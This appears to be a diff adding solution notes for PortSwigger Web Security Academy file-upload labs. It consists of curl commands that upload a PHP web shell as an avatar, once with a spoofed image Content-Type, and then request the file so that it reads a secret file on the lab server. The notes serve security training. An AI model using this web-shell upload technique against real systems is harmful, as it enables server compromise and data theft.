@@ -1108,9 +1108,22 @@ Solution:
 
 Solution:
 
+    # file upload:
+    curl --cookie 'session=dyqaoIriO5ZVrUFaVPkJzQUzO4owEwQG' -s https://acdb1f251fb9fcc8c0b20af000e500ae.web-security-academy.net/my-account/avatar -F "filename=s.php" -F "avatar='<?php system(\"cat /home/carlos/secret\") ?>';filename=s.php" -F "csrf=WjAuaitTZfPMr38U0DT3VY3cGA0ActDq" -F "user=wiener"
+    # file execution:
+    curl https://acdb1f251fb9fcc8c0b20af000e500ae.web-security-academy.net/files/avatars/s.php
+
 ### Lab: Web shell upload via Content-Type restriction bypass
 
     https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass
+
+Solution (as previously but explicitly spoof `Content-Type`):
+
+    curl --cookie 'session=tGHaK4JFRKUYlLN6LiAJi0kyAr3uPPpy' -s https://ac2b1f8e1e792d53c084231a00e50037.web-security-academy.net/my-account |grep csrf
+
+    curl --cookie 'session=tGHaK4JFRKUYlLN6LiAJi0kyAr3uPPpy' -s https://ac2b1f8e1e792d53c084231a00e50037.web-security-academy.net/my-account/avatar -F "filename=s.php" -F "avatar='<?php system(\"cat /home/carlos/secret\") ?>';filename=s.php;type=image/png" -F "csrf=bwZwpzDsnnWqkQwAj3vqLuvTEDN06VDx" -F "user=wiener"
+
+    curl --cookie 'session=tGHaK4JFRKUYlLN6LiAJi0kyAr3uPPpy' -s https://ac2b1f8e1e792d53c084231a00e50037.web-security-academy.net/files/avatars/s.php
 
 ## Business logic vulnerabilities
 
